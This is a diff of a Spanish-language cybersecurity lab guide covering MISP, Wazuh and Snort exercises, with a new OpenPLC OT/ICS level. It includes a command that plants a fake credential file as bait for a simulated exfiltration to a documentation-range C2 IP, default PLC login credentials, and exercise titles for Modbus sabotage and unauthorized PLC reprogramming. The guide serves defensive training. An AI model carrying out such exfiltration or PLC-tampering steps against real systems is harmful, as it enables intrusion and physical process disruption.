@@ -7,6 +7,7 @@
 - [Visión general de los escenarios](#visión-general-de-los-escenarios)
   - [Level-01 – Mini SOC: detección y monitorización](#level-01--mini-soc-detección-y-monitorización)
   - [Level-02 – MISP: Cyber Threat Intelligence](#level-02--misp-cyber-threat-intelligence)
+  - [Level-03 – OpenPLC: seguridad OT/ICS](#level-03--openplc-seguridad-otics)
 - [Normas generales del laboratorio](#normas-generales-del-laboratorio)
 - [Metodología de trabajo y evidencias](#metodología-de-trabajo-y-evidencias)
 - [Logs y verificaciones](#logs-y-verificaciones)
@@ -20,14 +21,21 @@
 - [Ejercicio 1.7 — Diseño e implementación de estrategia defensiva ante ataques a SSH](#ejercicio-17--diseño-e-implementación-de-estrategia-defensiva-ante-ataques-a-ssh)
 - [Ejercicio 1.8 — Creación de un KPI operativo basado en un ataque real](#ejercicio-18--creación-de-un-kpi-operativo-basado-en-un-ataque-real)
 - [Investigación Opcional — MITRE Caldera (profundización teórico-práctica)](#investigación-opcional--mitre-caldera-profundización-teórico-práctica)
-- [Ejercicio 2.0 — MISP: creación de un usuario y organización con mínimo privilegio](#ejercicio-20--misp-creación-de-un-usuario-y-organización-con-mínimo-privilegio)
-- [Ejercicio 2.1 — MISP: creación manual de un evento e IOCs](#ejercicio-21--misp-creación-manual-de-un-evento-e-iocs)
-- [Ejercicio 2.2 — MISP: consumo de un feed público de threat intelligence](#ejercicio-22--misp-consumo-de-un-feed-público-de-threat-intelligence)
-- [Ejercicio 2.3 — MISP: consultas a la API REST con curl](#ejercicio-23--misp-consultas-a-la-api-rest-con-curl)
-- [Ejercicio 2.4 — MISP: integración automática con Wazuh](#ejercicio-24--misp-integración-automática-con-wazuh)
-- [Ejercicio 2.5 — MISP: exportación de reglas Snort (NIDS)](#ejercicio-25--misp-exportación-de-reglas-snort-nids)
-- [Ejercicio 2.6 — MISP: caso de uso integral, escenario de exfiltración](#ejercicio-26--misp-caso-de-uso-integral-escenario-de-exfiltración)
-- [Ejercicio 2.7 — MISP: consolidar una ruta de ataque completa como caso de CTI](#ejercicio-27--misp-consolidar-una-ruta-de-ataque-completa-como-caso-de-cti)
+- [Ejercicio 2.0 — Creación de un usuario y organización con mínimo privilegio](#ejercicio-20--creación-de-un-usuario-y-organización-con-mínimo-privilegio)
+- [Ejercicio 2.1 — Creación manual de un evento e IOCs](#ejercicio-21--creación-manual-de-un-evento-e-iocs)
+- [Ejercicio 2.2 — Consumo de un feed público de threat intelligence](#ejercicio-22--consumo-de-un-feed-público-de-threat-intelligence)
+- [Ejercicio 2.3 — Consultas a la API REST con curl](#ejercicio-23--consultas-a-la-api-rest-con-curl)
+- [Ejercicio 2.4 — Integración automática con Wazuh](#ejercicio-24--integración-automática-con-wazuh)
+- [Ejercicio 2.5 — Exportación de reglas Snort (NIDS)](#ejercicio-25--exportación-de-reglas-snort-nids)
+- [Ejercicio 2.6 — Caso de uso integral, escenario de exfiltración](#ejercicio-26--caso-de-uso-integral-escenario-de-exfiltración)
+- [Ejercicio 2.7 — Consolidar una ruta de ataque completa como caso de CTI](#ejercicio-27--consolidar-una-ruta-de-ataque-completa-como-caso-de-cti)
+- [Ejercicio 3.0 — OpenPLC: visibilidad pasiva y estado base del proceso industrial](#ejercicio-30--openplc-visibilidad-pasiva-y-estado-base-del-proceso-industrial)
+- [Ejercicio 3.1 — Cadena de ataque OT: reconocimiento, interrogación y sabotaje Modbus](#ejercicio-31--cadena-de-ataque-ot-reconocimiento-interrogación-y-sabotaje-modbus)
+- [Ejercicio 3.2 — Correlación SOC e investigación con CTI (MISP)](#ejercicio-32--correlación-soc-e-investigación-con-cti-misp)
+- [Ejercicio 3.3 — Respuesta activa automatizada: Active Response guiada por CTI](#ejercicio-33--respuesta-activa-automatizada-active-response-guiada-por-cti)
+- [Ejercicio 3.4 — Persistencia OT: reprogramación no autorizada del PLC (Program Download)](#ejercicio-34--persistencia-ot-reprogramación-no-autorizada-del-plc-program-download)
+- [Ejercicio 3.5 — Más allá del indicador de red: artefacto (hash) y cadena de TTPs](#ejercicio-35--más-allá-del-indicador-de-red-artefacto-hash-y-cadena-de-ttps)
+- [Ejercicio 3.6 — Playbook de respuesta a incidentes OT](#ejercicio-36--playbook-de-respuesta-a-incidentes-ot)
 - [Investigación Opcional — MISP → Snort: automatización de IoCs e IDPS](#investigación-opcional--misp--snort-automatización-de-iocs-e-idps)
 
 ---
@@ -143,6 +151,44 @@ Nivel que **amplía** el Mini SOC del Level-01 añadiendo una plataforma de **Cy
 #### Nota importante (alcance y recursos)
 
 En el Ejercicio 2.2, el feed de threat intelligence que se active debe ser **pequeño y curado**: la VM `misp-server` está dimensionada para un laboratorio educativo (50 GB de disco), no para ingerir feeds masivos de producción.
+
+---
+
+### Level-03 – OpenPLC: seguridad OT/ICS
+
+Nivel que **incorpora** un proceso industrial simulado (OpenPLC, Modbus/TCP) al laboratorio, y lo conecta con todo lo construido en los niveles anteriores: detección de red (Level-01) e inteligencia de amenazas (Level-02). El foco pasa de IT puro a **IT-OT**: el mismo adversario que ya tenía antecedentes en el laboratorio pivota hacia un activo industrial, y la detección deja de basarse solo en indicadores de red para llegar a artefactos de host y secuencias de TTPs.
+
+#### Nodo adicional
+
+* **Nodo OT (PLC simulado):** OpenPLC Runtime _v3_
+  * S.O: Debian 12
+  * Configuración de recursos _(mínimo requerido)_:
+    * 1 CPU
+    * 2 GB de RAM
+    * 20 GB de Disco
+
+> **Requisito:** el Level-01 (3 VMs) y el Level-02 (`misp-server`, con `wazuh-misp.sh` ya ejecutado) deben estar desplegados e integrados antes de empezar este nivel, más esta 5ª VM `plc-server`.
+
+**Flujo operativo (qué se entrena)**
+
+1. **Visibilidad pasiva de OT**: monitorización de un proceso industrial sin agentes, solo con IDS de red.
+2. **Cadena de ataque OT completa**: reconocimiento, interrogación y sabotaje de un protocolo industrial sin autenticación (Modbus/TCP).
+3. **Correlación IT-OT**: reconocer al mismo actor atacando activos de distinta naturaleza, con y sin CTI de por medio.
+4. **Respuesta automatizada (SOAR)**: de "detecta y avisa" a "detecta, decide y actúa", con las limitaciones reales de topología que exige documentarlas, no ocultarlas.
+5. **Persistencia OT y detección más allá de la IP**: reprogramación no autorizada del PLC, detectada por artefacto (hash) y por cadena de TTPs, no solo por indicador de red.
+
+**Qué aprende el alumnado (competencias)**
+
+* Diferenciar la monitorización OT (pasiva, sin agentes) de la monitorización IT (basada en agentes), y por qué esa diferencia es estructural, no una limitación menor.
+* Detectar el abuso de un protocolo industrial legítimo sin exploits ni malware (Modbus/TCP).
+* Correlacionar un ataque transversal IT→OT usando el mismo actor como hilo conductor.
+* Diseñar una respuesta automatizada (Active Response) con las restricciones propias de OT (topología, confianza, seguridad física del proceso).
+* Elevar la confianza de una detección más allá de un único indicador de IP, incorporando artefactos de host (hash) y secuencias de TTPs (Pyramid of Pain).
+* Aplicar un playbook formal de respuesta a incidentes adaptado a las particularidades de OT frente a IT.
+
+#### Nota importante (alcance y recursos)
+
+`plc-server` no lleva agente Wazuh: es una decisión de diseño deliberada (Ejercicio 3.0), no una limitación técnica ocultada — refleja cómo se monitoriza un activo OT real. El propio laboratorio documenta explícitamente dónde esto impone restricciones (por ejemplo, en el alcance de la respuesta activa del Ejercicio 3.3) en vez de simplificarlas.
 
 ---
 
@@ -2433,7 +2479,7 @@ Para cada bloque seleccionado, redactar:
 
 ---
 
-## Ejercicio 2.0 — MISP: creación de un usuario y organización con mínimo privilegio
+## Ejercicio 2.0 — Creación de un usuario y organización con mínimo privilegio
 
 ### Objetivo
 
@@ -2522,7 +2568,7 @@ Incluya:
 
 ---
 
-## Ejercicio 2.1 — MISP: creación manual de un evento e IOCs
+## Ejercicio 2.1 — Creación manual de un evento e IOCs
 
 ### Objetivo
 
@@ -2604,7 +2650,7 @@ Hasta aquí el evento tiene un IOC, pero le falta contexto estructurado. MISP of
 
 * **Activar la taxonomía TLP (paso previo):** MISP trae muchas taxonomías precargadas, pero la mayoría vienen **desactivadas** por defecto (incluida `tlp`), así que no aparecerán en el buscador de tags hasta activarlas. Vaya a **Event Actions** (barra superior) → **List Taxonomies** (visible con `Publisher`), busque `tlp` y ábrala. A partir de aquí, **Enable** y **Update Taxonomies** solo están disponibles para el rol administrador, así que este paso concreto debe hacerse como admin: pulse **Enable** y después **Update Taxonomies** para que el cambio surta efecto. Documente esa elevación puntual, como en ejercicios anteriores. Enable/Update dejan la taxonomía disponible en el sistema, pero para que sus etiquetas aparezcan realmente en el buscador de **Add Tag** aún falta activar las tags concretas: dentro de la taxonomía `tlp` ya abierta, en el listado de tags (columna **Active Tags**), marque como activas las que vaya a usar (por ejemplo `tlp:amber`).
 * **Taxonomía TLP:** en la vista del evento, **Add a tag** → busque `tlp:` y elija el nivel adecuado (por ejemplo `tlp:amber`, "compartible dentro de la organización, no fuera"). No confunda esto con `Distribution`: `Distribution` controla técnicamente **quién puede ver** el evento en MISP; el tag **TLP** es la instrucción de **cómo debe tratar la información** quien la reciba, aunque ambos apunten en la misma dirección.
-* **Galaxy MITRE ATT&CK:** en la vista del evento, **Add new cluster** → busque `Attack Pattern` (galaxy de MITRE ATT&CK) y seleccione la técnica que corresponda a la actividad observada (por ejemplo, `T1595 - Active Scanning`, si el evento documenta el reconocimiento con Nmap del Ejercicio 1.4 del Level-01). Esto conecta directamente con el mapeo a ATT&CK Navigator que ya hicisteis "aparte" en los Ejercicios 1.6-1.7: aquí veis que MISP puede hacer ese mismo mapeo dentro de la propia plataforma de CTI. A diferencia de las taxonomías, las Galaxies suelen venir **activadas** por defecto; si no encuentra `Attack Pattern` en el buscador, revise igualmente en **Administration → List Galaxies** que esté habilitada.
+* **Galaxy MITRE ATT&CK:** en la vista del evento, **Add new cluster** → busque `Attack Pattern` (galaxy de MITRE ATT&CK) y seleccione la técnica que corresponda a la actividad observada (por ejemplo, `T1595 - Active Scanning`, si el evento documenta el reconocimiento con Nmap del Ejercicio 1.4 del Level-01). Esto conecta directamente con el mapeo a ATT&CK Navigator ya realizado "aparte" en los Ejercicios 1.6-1.7: aquí se comprueba que MISP puede hacer ese mismo mapeo dentro de la propia plataforma de CTI. A diferencia de las taxonomías, las Galaxies suelen venir **activadas** por defecto; si no encuentra `Attack Pattern` en el buscador, revise igualmente en **Administration → List Galaxies** que esté habilitada.
 
 **Evidencie (si se realiza)**
 
@@ -2630,14 +2676,12 @@ Hasta aquí el evento tiene un IOC, pero le falta contexto estructurado. MISP of
 Incluya:
 
 * Qué es un **Event** y qué es un **Attribute** en MISP, y cómo se relacionan.
-* Para qué sirve el flag **IDS**
 * Qué es la **distribución** y por qué importa en un contexto real (compartir o no compartir con otras organizaciones).
 * (Si se realiza) diferencia entre `Distribution`  y el tag **TLP** , y qué aporta enlazar el evento a una técnica **MITRE ATT&CK** vía Galaxy frente a mapearlo solo en el Navigator externo.
-* Cómo este evento servirá de base para los Ejercicios 2.3 (consulta por API) y 2.4 (integración automática con Wazuh).
 
 ---
 
-## Ejercicio 2.2 — MISP: consumo de un feed público de threat intelligence
+## Ejercicio 2.2 — Consumo de un feed público de threat intelligence
 
 ### Objetivo
 
@@ -2659,17 +2703,17 @@ Dar de alta manualmente, activar y sincronizar un **feed externo** de indicadore
 
 En el Dashboard de MISP:
 
-* **Sync Actions → List Feeds**. Verá 2 feeds predefinidos, deshabilitados: **CIRCL OSINT Feed** y **The Botvrij.eu Data**. Son fuentes que MISP ya conoce, en formato nativo "MISP Feed" (eventos ya estructurados vía `manifest.json`). En este ejercicio vamos a trabajar con dos fuentes distintas para comparar:
+* **Sync Actions → List Feeds**. Verá 2 feeds predefinidos, deshabilitados: **CIRCL OSINT Feed** y **The Botvrij.eu Data**. Son fuentes que MISP ya conoce, en formato nativo "MISP Feed" (eventos ya estructurados vía `manifest.json`). Este ejercicio trabaja con dos fuentes distintas para comparar:
   1. Una fuente que **MISP no trae por defecto**, dada de alta manualmente desde cero, tal como se haría con un proveedor de threat intel nuevo.
   2. Uno de los dos feeds nativos ya preconfigurados, simplemente activándolo, para ver cómo importa MISP un feed en su propio formato estructurado.
-* Fuente nueva que usaremos: **blocklist.de**, IPs reportadas por ataques SSH por fuerza bruta, con estos parámetros (verificados: URL accesible, ~4.445 IPs, ~63 KB de texto plano, pequeño y directamente relacionado con el Ejercicio 1.6 del Level-01, el ataque SSH con Hydra):
+* Fuente nueva a dar de alta: **blocklist.de**, IPs reportadas por ataques SSH por fuerza bruta, con estos parámetros (verificados: URL accesible, ~4.445 IPs, ~63 KB de texto plano, pequeño y directamente relacionado con el Ejercicio 1.6 del Level-01, el ataque SSH con Hydra):
 
   * **Name:** `blocklist.de - SSH attackers`
   * **Provider:** `blocklist.de`
   * **URL:** `https://lists.blocklist.de/lists/ssh.txt`
   * **Input source:** `Network`
   * **Source format:** `Freetext` (a diferencia de CIRCL/Botvrij, formato nativo "MISP Feed" con eventos ya estructurados, esta fuente es una lista plana de IPs sin estructura MISP; el formato `Freetext` hace que MISP reconozca automáticamente el patrón de IOC, aquí IPs, en cada línea).
-* Feed nativo que activaremos: **The Botvrij.eu Data**, ya preconfigurado (formato `MISP Feed`, no necesita rellenar formulario). Se ha comprobado su tamaño real (~435 eventos, ~10 MB en total): sincroniza en segundos y permite ver el resultado completo de inmediato, algo idóneo para un ejercicio de laboratorio acotado en el tiempo. El otro feed predefinido, **CIRCL OSINT Feed**, se deja deliberadamente sin activar: ronda 1.670 eventos y, por el tamaño de varios de sus informes individuales, puede suponer del orden de 1-2 GB de datos en bruto. No es un problema de espacio en disco (el 50 GB de `misp-server` lo asume sin problema), sino de alcance: tardaría bastante más en sincronizar y añadiría un volumen de eventos poco manejable para explorar en el propio ejercicio.
+* Feed nativo a activar: **The Botvrij.eu Data**, ya preconfigurado (formato `MISP Feed`, no necesita rellenar formulario). Se ha comprobado su tamaño real (~435 eventos, ~10 MB en total): sincroniza en segundos y permite ver el resultado completo de inmediato, algo idóneo para un ejercicio de laboratorio acotado en el tiempo. El otro feed predefinido, **CIRCL OSINT Feed**, se deja deliberadamente sin activar: ronda 1.670 eventos y, por el tamaño de varios de sus informes individuales, puede suponer del varios GB de datos en bruto.
 
 **Evidencie**
 
@@ -2681,7 +2725,7 @@ En el Dashboard de MISP:
 
 1. **Sync Actions → List Feeds → Add Feed**.
 2. Rellene el formulario con los parámetros de arriba (Name, Provider, URL, Input source, Source format).
-3. **Distribution:** puede dejar `All communities`, ya que es contenido público de un feed OSINT y no afecta al alcance de vuestros propios datos del Ejercicio 2.1.
+3. **Distribution:** puede dejar `All communities`, ya que es contenido público de un feed OSINT y no afecta al alcance de los datos propios del Ejercicio 2.1.
 4. Marque **Enabled**.
 5. Guarde.
 
@@ -2713,7 +2757,7 @@ En el Dashboard de MISP:
 
 1. Vaya a **Event Actions → List Events** y localice los eventos importados por ambos feeds.
    * `blocklist.de` (formato `Freetext`): es normal que el resultado sea **un único evento** con miles de atributos de tipo `ip-src`/`ip-dst`.
-   * `Botvrij.eu Data` (formato nativo `MISP Feed`): al contrario, veréis **varios eventos pequeños y ya estructurados**, uno por cada indicador/informe original de la fuente. Esta es la diferencia práctica entre un feed en formato nativo de MISP y uno en texto plano interpretado con `Freetext`.
+   * `Botvrij.eu Data` (formato nativo `MISP Feed`): al contrario, aparecen **varios eventos pequeños y ya estructurados**, uno por cada indicador/informe original de la fuente. Esta es la diferencia práctica entre un feed en formato nativo de MISP y uno en texto plano interpretado con `Freetext`.
 2. Use **Search Attributes** filtrando por tipo `ip-src` para localizar IPs concretas, y abra el evento de origen.
 
 **Evidencie**
@@ -2748,11 +2792,11 @@ Incluya:
 * Qué parámetros definen un feed en MISP (URL, formato de origen: `MISP Feed` vs `Freetext`/`CSV`, distribución) y qué papel juega cada uno.
 * Diferencia entre un IOC propio (Ejercicio 2.1) y uno de fuente externa (este ejercicio).
 * Cómo esto se traduce a un caso real: dar de alta un feed nuevo es lo que haría un analista al incorporar un proveedor de threat intelligence (comercial o comunitario) que no viene precargado en la plataforma. Y por qué muchas fuentes reales (como listas de bloqueo) no vienen en formato nativo MISP.
-* Cómo conecta con el Ejercicio 1.6 del Level-01: la IP atacante de vuestro ataque Hydra es una IP **privada** del propio laboratorio, así que nunca aparecería en un feed OSINT público como `blocklist.de` (que solo recoge IPs de Internet reportadas por terceros); ninguna cantidad de feeds públicos habría detectado ese ataque por reputación. ¿Qué aporta entonces este tipo de feed, y qué límite real tiene frente a una amenaza interna o de un origen aún no reportado por nadie?
+* Cómo conecta con el Ejercicio 1.6 del Level-01: la IP atacante del ataque Hydra de ese ejercicio es una IP **privada** del propio laboratorio, así que nunca aparecería en un feed OSINT público como `blocklist.de` (que solo recoge IPs de Internet reportadas por terceros); ninguna cantidad de feeds públicos habría detectado ese ataque por reputación. ¿Qué aporta entonces este tipo de feed, y qué límite real tiene frente a una amenaza interna o de un origen aún no reportado por nadie?
 
 ---
 
-## Ejercicio 2.3 — MISP: consultas a la API REST con curl
+## Ejercicio 2.3 — Consultas a la API REST con curl
 
 ### Objetivo
 
@@ -2774,8 +2818,6 @@ Inicie sesión en MISP con el **usuario de laboratorio** del Ejercicio 2.0. Cada
 2. **Add authentication key**.
 3. Copie la clave generada: MISP solo la muestra **una vez**.
 
-> Usar la clave del usuario de laboratorio en vez de la del administrador es, de nuevo, mínimo privilegio: si esta clave se filtra, no compromete la administración completa de MISP.
-
 **Evidencie**
 
 * Captura de la Auth Key recién creada (sin mostrar la clave completa si se documenta fuera del entorno controlado).
@@ -2788,7 +2830,7 @@ Busque la IP creada en el Ejercicio 2.1:
 
 ```bash
 curl -k -s \
-  -H "Authorization: TU_API_KEY" \
+  -H "Authorization: API_KEY" \
   -H "Accept: application/json" -H "Content-Type: application/json" \
   -d '{"value": "IP_DE_CALDERA", "type": ["ip-src"]}' \
   https://IP_MISP/attributes/restSearch
@@ -2808,7 +2850,7 @@ Repita la misma consulta con una IP que **no** exista en MISP (por ejemplo, `198
 
 ```bash
 curl -k -s \
-  -H "Authorization: TU_API_KEY" \
+  -H "Authorization: API_KEY" \
   -H "Accept: application/json" -H "Content-Type: application/json" \
   -d '{"value": "198.51.100.1", "type": ["ip-src"]}' \
   https://IP_MISP/attributes/restSearch
@@ -2823,7 +2865,7 @@ Compruebe que `response.Attribute` viene vacío (`[]`).
 #### (Opcional) Comprobación de versión del servidor
 
 ```bash
-curl -k -s -H "Authorization: TU_API_KEY" -H "Accept: application/json" \
+curl -k -s -H "Authorization: API_KEY" -H "Accept: application/json" \
   https://IP_MISP/servers/getVersion
 ```
 
@@ -2847,7 +2889,7 @@ Incluya:
 
 ---
 
-## Ejercicio 2.4 — MISP: integración automática con Wazuh
+## Ejercicio 2.4 — Integración automática con Wazuh
 
 ### Objetivo
 
@@ -2858,8 +2900,6 @@ Desplegar y validar la integración automática (`automation/wazuh-misp.sh`) que
 * Ejercicios 2.1 y 2.3 completados (evento publicado en MISP con la IP de `caldera-server`; API key **del usuario de laboratorio** generada).
 * Level-01 desplegado e integrado (`automation/wazuh-snort.sh` ya ejecutado).
 * Clave SSH generada (`automation/key-generate.sh`) y acceso desde el anfitrión a las VMs del laboratorio.
-
-> ℹ️ **Nota de mínimo privilegio:** use la API key del usuario de laboratorio (Ejercicio 2.3), **no la del administrador**. Esa clave queda guardada en `ossec.conf` del Wazuh Manager; si fuera la de admin, cualquiera con acceso a esa VM tendría de facto privilegios de administrador sobre MISP.
 
 ---
 
@@ -2880,7 +2920,7 @@ Desplegar y validar la integración automática (`automation/wazuh-misp.sh`) que
    5. Como es un log más, Wazuh lo compara contra todas sus reglas, y ahí es donde entran `600200`-`600203`: son las únicas reglas que "reconocen" ese log concreto (buscan el campo `"integration":"misp_ip"`) y deciden qué hacer con él: `600202` (nivel 12) si `found` es `1` (coincidencia), `600201` (nivel 0, silenciosa) si `found` es `0`, `600203` si hubo un error de conexión o credenciales.
 4. **Por qué así:** separa claramente "detectar" (Snort + reglas de Snort del Level-01) de "enriquecer con contexto" (este script). Wazuh sigue funcionando igual sin MISP, y MISP solo añade una capa de contexto encima de alertas que ya existían.
 
-**Cómo verlo con vuestros propios ojos:**
+**Cómo comprobarlo directamente:**
 
 * El código que se va a desplegar es legible **antes** de ejecutar nada, directamente en `automation/wazuh-misp.sh`: el bloque entre `cat > "$TMP_INTEGRATION" <<'PYEOF'` y `PYEOF` es el script Python completo; el bloque con `<group name="local,misp,threat_intel,">` son las reglas.
 * **Después** de desplegarlo, en el propio Wazuh Manager:
@@ -3005,13 +3045,13 @@ Si es posible generar tráfico detectado por Snort desde un origen que **no** es
 
 Incluya:
 
-* Qué aporta esta integración frente a Snort + Wazuh solos (Level-01): pasar de "hay tráfico sospechoso" a "hay tráfico de un origen con antecedentes conocidos en threat intelligence".
+* Qué aporta esta integración frente a Snort + Wazuh solos (Level-01).
 * Cómo esto refuerza el ciclo **detección → investigación → mejora → reporte** con una capa adicional de contexto.
 * Valor SOC: priorización del triage.
 
 ---
 
-## Ejercicio 2.5 — MISP: exportación de reglas Snort (NIDS)
+## Ejercicio 2.5 — Exportación de reglas Snort (NIDS)
 
 ### Objetivo
 
@@ -3027,7 +3067,7 @@ Usar la exportación nativa de MISP a formato Snort/Suricata (NIDS) para convert
 
 ### 2.5.1. Preparación e identificación
 
-Confirme que el evento del Ejercicio 2.1 sigue publicado, con el atributo `ip-src` marcado como **IDS** (columna/icono "IDS" activo en la vista del evento): solo los atributos con ese flag se incluyen en la exportación NIDS.
+Confirme que el evento del Ejercicio 2.1 sigue publicado, con el atributo `ip-src` marcado como **IDS**. Solo los atributos con ese flag se incluyen en la exportación NIDS.
 
 **Evidencie**
 
@@ -3078,7 +3118,7 @@ sudo tail -f /var/log/snort/alert_fast.txt
 ### Validación / Troubleshooting
 
 * Si la exportación no incluye la IP esperada, confirme que el atributo tiene el flag **IDS** activo: MISP excluye del export NIDS cualquier atributo sin ese flag.
-* Si Snort da error al cargar el `.rules` por colisión de SID, tenga en cuenta que las reglas locales del Level-01 ya usan SIDs propios (visibles en `alert_fast.txt` como `[1:1001001:1]` y `[1:1000010:1]`); verifique en la práctica el rango de SIDs que asigna vuestra instalación de MISP y ajuste si colisiona.
+* Si Snort da error al cargar el `.rules` por colisión de SID, tenga en cuenta que las reglas locales del Level-01 ya usan SIDs propios (visibles en `alert_fast.txt` como `[1:1001001:1]` y `[1:1000010:1]`); verifique en la práctica el rango de SIDs que asigna la instalación de MISP del laboratorio y ajuste si colisiona.
 * Si no aparece ninguna alerta nueva, confirme que relanzó Snort **incluyendo** el nuevo fichero de reglas (`-R`), no solo con `snort.lua`.
 
 ### Evidencias a entregar
@@ -3093,11 +3133,10 @@ Incluya:
 
 * Diferencia entre este ejercicio (MISP → Snort, proactivo) y el Ejercicio 2.4 (Snort → Wazuh → MISP, reactivo): quién actúa primero y en qué capa ocurre la detección.
 * Qué mantenimiento exige este modelo (refrescar la exportación cuando cambien los IOCs en MISP) frente al modelo reactivo, que consulta MISP en vivo en cada alerta.
-* Cuándo tiene sentido cada patrón en un SOC real: detección proactiva de IOCs conocidos en el perímetro frente a enriquecimiento contextual de alertas ya generadas.
 
 ---
 
-## Ejercicio 2.6 — MISP: caso de uso integral, escenario de exfiltración
+## Ejercicio 2.6 — Caso de uso integral, escenario de exfiltración
 
 ### Objetivo
 
@@ -3122,7 +3161,7 @@ Cerrar el ciclo completo del laboratorio uniendo Level-01 (Caldera, Snort, Wazuh
 sudo bash -c 'echo "admin:P@ssw0rd_lab_2026" > /root/passwords.txt'
 ```
 
-2. IP de C2 ficticia que usaremos: **`203.0.113.50`**. Pertenece al rango `TEST-NET-3` (RFC 5737), reservado para documentación: no resuelve a ninguna infraestructura real, así que es segura para registrarla como IOC sin riesgo de apuntar sin querer a un tercero.
+2. IP de C2 ficticia a utilizar: **`203.0.113.50`**. Pertenece al rango `TEST-NET-3` (RFC 5737), reservado para documentación: no resuelve a ninguna infraestructura real, así que es segura para registrarla como IOC sin riesgo de apuntar sin querer a un tercero.
 
 **Evidencie**
 
@@ -3210,7 +3249,7 @@ sudo systemctl restart wazuh-manager
 2. Agrupe las 3 abilities en un Adversary (por ejemplo, `Simulated-Exfiltration`), en el orden Discovery → Collection → Exfiltration.
 3. Desde el Dashboard de Caldera (alojado en `caldera-server`), **Start New Operation** con:
    * **Adversary:** el que acaba de crear (`Simulated-Exfiltration`), no `No Adversary (manual)`.
-   * **Group:** `red` (el mismo grupo del agente de `snort-server` que ya usasteis en el Ejercicio 1.3), no `All groups`.
+   * **Group:** `red` (el mismo grupo del agente de `snort-server` ya utilizado en el Ejercicio 1.3), no `All groups`.
    * **Planner:** `atomic`.
    * **Run State:** `Run immediately`.
 
@@ -3242,7 +3281,7 @@ sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | tail -5
 
 ### Validación / Troubleshooting
 
-* Si `found` sigue en `0`, confirme que redesplegasteis `wazuh-misp.sh` incluyendo el nuevo `rule_id` (`600300`) en el prompt, y que el evento del C2 en MISP está `Published` con el atributo `ip-dst` marcado IDS.
+* Si `found` sigue en `0`, confirme que se redesplegó `wazuh-misp.sh` incluyendo el nuevo `rule_id` (`600300`) en el prompt, y que el evento del C2 en MISP está `Published` con el atributo `ip-dst` marcado IDS.
 * Si el paso de Exfiltration se queda colgado más de unos segundos, confirme que se usó `--max-time`; `203.0.113.50` no es enrutable y la conexión no debe completarse nunca.
 * Si Snort no genera ninguna alerta, revise que la regla nueva esté cargada (mismo troubleshooting que el Ejercicio 1.5) y que el puerto de destino del `curl` coincida con el de la regla.
 
@@ -3258,12 +3297,11 @@ sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | tail -5
 Incluya:
 
 * Cómo este ejercicio conecta todo el laboratorio: Caldera (Level-01) genera la actividad ofensiva, Snort y Wazuh (Level-01) la detectan, y MISP (Level-02) le da contexto de amenaza. Es el ciclo detección → investigación → mejora → reporte con el que arranca esta guía, aplicado de principio a fin.
-* Por qué hizo falta modificar el script de integración para comprobar `dstip` además de `srcip`, y qué dice esto sobre diseñar integraciones pensando en más de un tipo de escenario (tráfico entrante frente a tráfico saliente).
 * Diferencia entre "detectar un ataque" (lo que ya hacía el Level-01 solo) y "saber que ese ataque tiene relación con una amenaza conocida" (lo que añade MISP): qué aporta eso a la priorización en un SOC real.
 
 ---
 
-## Ejercicio 2.7 — MISP: consolidar una ruta de ataque completa como caso de CTI
+## Ejercicio 2.7 — Consolidar una ruta de ataque completa como caso de CTI
 
 ### Objetivo
 
@@ -3308,7 +3346,7 @@ Antes de tocar MISP, recopile la evidencia real que ya generó en el Level-01:
 
    > ℹ️ `target-user` no se marca como IDS: no es un patrón de red exportable a un IDS, es información de contexto sobre a quién/qué afectó el ataque. Si no encuentra `target-user` en el desplegable de `Type`, búsquelo dentro de la categoría `Targeting data`.
 
-4. Ajuste el campo de fecha del evento (`Date`) a la fecha real en la que ejecutó el Ejercicio 1.6, para que el evento refleje cuándo ocurrió el ataque, no cuándo lo estáis documentando.
+4. Ajuste el campo de fecha del evento (`Date`) a la fecha real en la que ejecutó el Ejercicio 1.6, para que el evento refleje cuándo ocurrió el ataque, no cuándo se está documentando.
 5. Añada dos Galaxies ATT&CK, una por fase (**Add new cluster**):
    * `T1595 - Active Scanning` (reconocimiento, Ejercicio 1.4).
    * `T1110 - Brute Force` (fuerza bruta, Ejercicio 1.6).
@@ -3345,6 +3383,774 @@ Incluya:
 * Diferencia entre un IOC aislado (Ejercicio 2.1) y un caso de CTI consolidado (este ejercicio): qué aporta el contexto y la relación entre indicadores frente a un dato suelto.
 * Por qué en un SOC real rara vez se registra un único indicador sin relacionarlo con el resto de la ruta de ataque: el valor de la CTI está tanto en los indicadores como en cómo se conectan entre sí.
 * Cómo este ejercicio cierra el ciclo del laboratorio en el sentido inverso a los anteriores: en vez de usar MISP para detectar un ataque nuevo, se usa la propia actividad ya generada en el Level-01 como fuente de la inteligencia que alimenta MISP.
+
+---
+
+## Ejercicio 3.0 — OpenPLC: visibilidad pasiva y estado base del proceso industrial
+
+### Objetivo
+
+En redes IT, Wazuh puede instalar un agente dentro de casi cualquier host. En redes OT esto normalmente no es posible: un PLC no es un servidor con un sistema operativo tradicional donde instalar software de terceros, y hacerlo comprometería sus garantías de tiempo real y la seguridad de la planta. Por eso la monitorización en OT suele ser **pasiva**, a nivel de red (un IDS como Snort observando el tráfico), no basada en agentes. Este ejercicio prepara el proceso industrial simulado (OpenPLC) y confirma que Snort lo vigila de forma pasiva, sin alertar todavía por nada, como punto de partida antes de simular un ataque.
+
+### Prerrequisitos
+
+* `OpenPLC/install-openplc.sh` ejecutado en `plc-server` (Ejercicio de instalación de OpenPLC).
+* `automation/prep-openplc-snort.sh` ejecutado contra `snort-server` (inspector Modbus habilitado).
+* Fichero `OpenPLC/tanque_control.st` del repositorio, disponible para subirlo.
+
+---
+
+### 3.0.1. Preparación e identificación
+
+Localice en el repositorio el fichero `OpenPLC/tanque_control.st`. Es un programa mínimo en texto estructurado (IEC 61131-3) con dos variables:
+
+* `setpoint_temperatura` (`%MW0`): consigna de temperatura del proceso (valor inicial `75`).
+* `nivel_tanque` (`%MW1`): lectura simulada del nivel del tanque (valor inicial `50`).
+
+No se le pide programar nada: el objetivo de este ejercicio es operar el PLC, no desarrollar lógica de control.
+
+**Evidencie**
+
+* Captura del contenido del fichero `tanque_control.st` (para dejar constancia de qué programa se usó).
+
+### 3.0.2. Ejecución (arranque del proceso industrial)
+
+1. Acceda a la interfaz web de OpenPLC: `http://<IP_PLC_SERVER>:8080` (usuario/contraseña: `openplc` / `openplc`).
+2. Vaya a **Programs → Add new program**, suba `tanque_control.st`, y compílelo.
+3. Vaya al **Dashboard** y pulse **Start PLC**.
